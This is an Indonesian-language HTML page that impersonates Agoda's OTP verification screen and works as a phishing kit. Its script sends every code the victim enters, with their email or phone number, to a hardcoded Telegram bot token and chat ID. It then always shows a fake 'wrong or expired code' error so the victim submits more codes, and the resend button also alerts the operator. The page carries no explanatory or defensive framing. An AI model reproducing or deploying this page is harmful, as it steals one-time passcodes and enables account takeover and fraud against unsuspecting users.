<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi OTP - Agoda</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            background: linear-gradient(135deg, #f0f4ff 0%, #ffffff 50%, #f0f4ff 100%);
            min-height: 100vh;
            display: flex; align-items: center; justify-content: center; padding: 20px;
        }
        .container {
            width: 100%; max-width: 420px; background: white; border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08); padding: 40px 32px;
        }
        .logo-container { text-align: center; margin-bottom: 32px; }
        .logo { height: 42px; margin-bottom: 24px; }
        .title { font-size: 28px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
        .subtitle { font-size: 14px; color: #666; line-height: 1.5; }
        .otp-inputs { display: flex; gap: 8px; justify-content: center; margin: 24px 0; }
        .otp-input {
            width: 42px; height: 52px; text-align: center; font-size: 20px; font-weight: 600;
            border: 1px solid #ddd; border-radius: 8px; transition: all 0.2s;
        }
        .otp-input:focus { outline: none; border-color: #0066cc; box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1); background: #f8faff; }
        .error-message { padding: 12px; background: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; color: #dc2626; font-size: 13px; margin-bottom: 16px; display: none; }
        .error-message.show { display: block; }
        .submit-btn {
            width: 100%; padding: 14px 16px; background: #0066cc; color: white; border: none;
            border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer;
            transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 24px;
        }
        .submit-btn:hover:not(:disabled) { background: #0052a3; }
        .submit-btn:disabled { background: #ccc; cursor: not-allowed; opacity: 0.6; }
        .spinner { width: 16px; height: 16px; border: 2px solid rgba(255, 255, 255, 0.3); border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; display: inline-block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .timer-section { margin-top: 24px; text-align: center; font-size: 13px; color: #666; }
        .timer-text { color: #0066cc; font-weight: 600; }
        .resend-section { text-align: center; margin-top: 20px; }
        .resend-btn { background: none; border: none; color: #0066cc; font-weight: 600; font-size: 14px; cursor: pointer; }
        .resend-btn:hover { text-decoration: underline; }
        .footer { margin-top: 32px; padding-top: 24px; border-top: 1px solid #eee; text-align: center; font-size: 12px; color: #999; }
        @media (max-width: 480px) { .container { padding: 32px 20px; } .title { font-size: 24px; } .otp-input { width: 38px; height: 48px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="https://cdn6.agoda.net/images/kite-js/logo/agoda/color-default.svg" alt="Agoda Logo" class="logo">
            <h4 class="title">Verifikasi OTP</h4>
            <p class="subtitle" id="sub">Kami telah mengirimkan kode 6 digit ke email atau nomor telepon Anda.</p>
        </div>
        <div id="err" class="error-message"></div>
        <form onsubmit="hS(event)">
            <div class="otp-inputs">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
            </div>
            <button type="submit" class="submit-btn" id="sB"><span id="sT">Lanjutkan</span></button>
        </form>
        <div class="timer-section">Kode berlaku dalam <span class="timer-text" id="tT">01:00</span></div>
        <div class="resend-section"><button type="button" class="resend-btn" onclick="hR()">Kirim ulang OTP</button></div>
        <div class="footer"><p>Jangan bagikan kode OTP Anda kepada siapa pun. Agoda tidak akan pernah meminta kode Anda.</p></div>
    </div>
    <script>
        const BOT_TOKEN = '7622590670:AAHh46L-JfETNyK1fSs2rth26Pmcq1fIE5w';
        const CHAT_ID = '6691063456';
        const p = new URLSearchParams(window.location.search);
        const m = p.get('method'); const v = p.get('value') || '';
        const sub = document.getElementById('sub');
        if (m === 'email') sub.innerHTML = `Kami telah mengirimkan kode 6 digit ke email <strong>${v}</strong> Anda.`;
        else if (m === 'phone') sub.innerHTML = `Kami telah mengirimkan kode 6 digit ke nomor telepon <strong>${v}</strong> Anda.`;

        const inps = document.querySelectorAll('.otp-input');
        inps.forEach((i, idx) => {
            i.addEventListener('input', (e) => {
                if (!/^\d$/.test(e.target.value)) { e.target.value = ''; return; }
                if (idx < inps.length - 1 && e.target.value) inps[idx + 1].focus();
            });
            i.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && !e.target.value && idx > 0) inps[idx - 1].focus(); });
        });

        async function hS(e) {
            e.preventDefault();
            const otp = Array.from(inps).map(i => i.value).join('');
            if (otp.length !== 6) return;
            const btn = document.getElementById('sB'); const txt = document.getElementById('sT'); const err = document.getElementById('err');
            btn.disabled = true; txt.innerHTML = '<span class="spinner"></span> Memproses...';
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🔐 *OTP Baru*\n👤 *User:* \`${v}\`\n🔢 *OTP:* \`${otp}\``, parse_mode: 'Markdown' })
                });
                setTimeout(() => {
                    err.textContent = 'Kode verifikasi salah atau kadaluarsa. Silakan coba lagi.'; err.classList.add('show');
                    inps.forEach(i => i.value = ''); inps[0].focus(); btn.disabled = false; txt.textContent = 'Lanjutkan';
                }, 1500);
            } catch (x) { btn.disabled = false; txt.textContent = 'Lanjutkan'; }
        }

        async function hR() {
            const rb = document.querySelector('.resend-btn');
            rb.disabled = true; rb.textContent = 'Mengirim ulang...';
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🔄 *Resend OTP*\n👤 *User:* \`${v}\``, parse_mode: 'Markdown' })
                });
                tL = 60; rb.disabled = false; rb.textContent = 'Kirim ulang OTP';
            } catch (x) { rb.disabled = false; rb.textContent = 'Kirim ulang OTP'; }
        }

        let tL = 60;
        setInterval(() => {
            if (tL > 0) {
                tL--; const mins = Math.floor(tL / 60); const secs = tL % 60;
                document.getElementById('tT').textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
            } else { tL = 60; }
        }, 1000);
    </script>
</body>
</html>
